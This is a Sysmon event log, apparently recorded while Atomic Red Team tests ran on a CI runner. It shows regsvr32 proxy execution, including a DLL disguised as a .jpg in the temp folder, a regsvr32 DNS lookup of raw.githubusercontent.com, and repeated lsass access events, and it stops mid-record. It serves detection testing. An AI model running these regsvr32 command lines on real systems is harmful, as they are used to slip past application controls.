"12/17/2025 8:06:47 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:47.311
ProcessGuid: {f995aebf-6497-6942-e106-000000000e00}
ProcessId: 7712
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.661
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.661
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.515
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.464
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.413
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.356
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.299
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.247
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.193
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.139
SourceProcessGUID: {f995aebf-6491-6942-dd06-000000000e00}
SourceProcessId: 6652
SourceThreadId: 6656
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:06:41.135
ProcessGuid: {f995aebf-6491-6942-dd06-000000000e00}
ProcessId: 6652
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.085
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:41 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:06:41.085
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.032
ProcessGuid: {f995aebf-5ae3-6942-ce00-000000000e00}
ProcessId: 1488
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.032
ProcessGuid: {f995aebf-5ae3-6942-ce00-000000000e00}
ProcessId: 1488
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.030
ProcessGuid: {f995aebf-5ae3-6942-ce00-000000000e00}
ProcessId: 1488
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:47 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 08:04:47.016
ProcessGuid: {f995aebf-5ae5-6942-d600-000000000e00}
ProcessId: 7596
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:41 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:04:39.348
ProcessGuid: {f995aebf-6417-6942-c406-000000000e00}
ProcessId: 6288
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:41.116
ProcessGuid: {f995aebf-6419-6942-d206-000000000e00}
ProcessId: 4168
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine:   /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-6419-6942-d106-000000000e00}
ParentProcessId: 4100
ParentImage: C:\Windows\System32\regsvr32.exe
ParentCommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:41.095
ProcessGuid: {f995aebf-6419-6942-d106-000000000e00}
ProcessId: 4100
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-6419-6942-cf06-000000000e00}
ParentProcessId: 6856
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:41.072
ProcessGuid: {f995aebf-6419-6942-cf06-000000000e00}
ProcessId: 6856
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:40.809
ProcessGuid: {f995aebf-6418-6942-cd06-000000000e00}
ProcessId: 3116
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-6418-6942-cb06-000000000e00}
ParentProcessId: 9264
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:40.785
ProcessGuid: {f995aebf-6418-6942-cb06-000000000e00}
ProcessId: 9264
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %%temp%%\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:39.705
ProcessGuid: {f995aebf-6417-6942-c906-000000000e00}
ProcessId: 8072
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
